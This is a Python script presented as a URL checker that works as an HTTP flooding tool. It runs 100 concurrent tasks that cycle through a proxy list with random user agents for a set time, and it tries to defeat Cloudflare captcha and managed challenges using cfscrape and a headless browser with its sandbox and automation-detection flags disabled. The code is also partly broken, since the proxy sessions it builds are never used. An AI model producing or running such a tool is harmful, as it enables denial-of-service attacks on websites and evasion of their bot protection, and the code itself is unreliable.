import asyncio
import cfscrape
import cloudscraper
import requests
from fake_useragent import UserAgent
from pyppeteer import launch

url = input("Enter the URL to check: ")
num_threads = 100
requests_per_proxy = 7000
run_time = int(input("Enter the time in seconds to run: "))

scraper = cloudscraper.create_scraper()
ua = UserAgent()

with open('data/proxies.txt', 'r') as f:
    proxies = [line.strip() for line in f]

stop_threads = False

async def send_request():
    global stop_threads
    headers = {'User-Agent': ua.random}
    response = scraper.get(url, headers=headers, timeout=5)
    cookies = response.cookies

    while not stop_threads:
        proxy_url = proxies.pop(0)

        try:
            session = requests.Session()
            session.proxies = {"https": proxy_url}
            session.verify = False

            headers['Cookie'] = '; '.join([f"{cookie.name}={cookie.value}" for cookie in cookies])
            response = scraper.get(url, headers=headers, cookies=cookies, timeout=5)
            print(f"{proxy_url} - {headers['User-Agent']} - {response.status_code}")

        except Exception as e:
            print(f"{proxy_url} - {headers['User-Agent']} - {str(e)}")

            if "cloudflare" in str(e).lower() and "captcha" in str(e).lower():
                try:
                    clearance_cookie = cfscrape.get_cookie_string(url)['cf_clearance']
                    headers['Cookie'] = f"__cfduid={cookies['__cfduid']}; cf_clearance={clearance_cookie}"
                    response = scraper.get(url, headers=headers, cookies=cookies, timeout=5)
                    print(f"{proxy_url} - {headers['User-Agent']} - {response.status_code} - Cloudflare bypassed with cookie")
                except Exception as e:
                    print(f"{proxy_url} - {headers['User-Agent']} - {str(e)} - Cloudflare bypass with cookie failed")
        
            if "cloudflare" in str(e).lower() and "managed-challenge" in str(e).lower():
                try:
                    options = {"args": [
                        "--disable-extensions",
                        "--disable-features=NetworkService",
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--disable-web-security",
                        "--allow-running-insecure-content",
                        "--disable-blink-features=AutomationControlled"
                    ]}
                    browser = await launch(options=options)
                    page = await browser.newPage()
                    await page.setExtraHTTPHeaders(headers)
                    await page.goto(url)
                    await asyncio.sleep(15) # wait for Cloudflare challenge to complete
                    response = await page.content()
                    print(f"{proxy_url} - {headers['User-Agent']} - Cloudflare bypassed with pyppeteer")
                except Exception as e:
                    print(f"{proxy_url} - {headers['User-Agent']} - {str(e)} - Cloudflare bypass with pyppeteer failed")

        proxies.append(proxy_url)

async def main():
    tasks = []
    for i in range(num_threads):
        task = asyncio.create_task(send_request())
        tasks.append(task)

    await asyncio.sleep(run_time)

    global stop_threads
    stop_threads = True

    await asyncio.gather(*tasks)

asyncio.run(main())
print("Done")
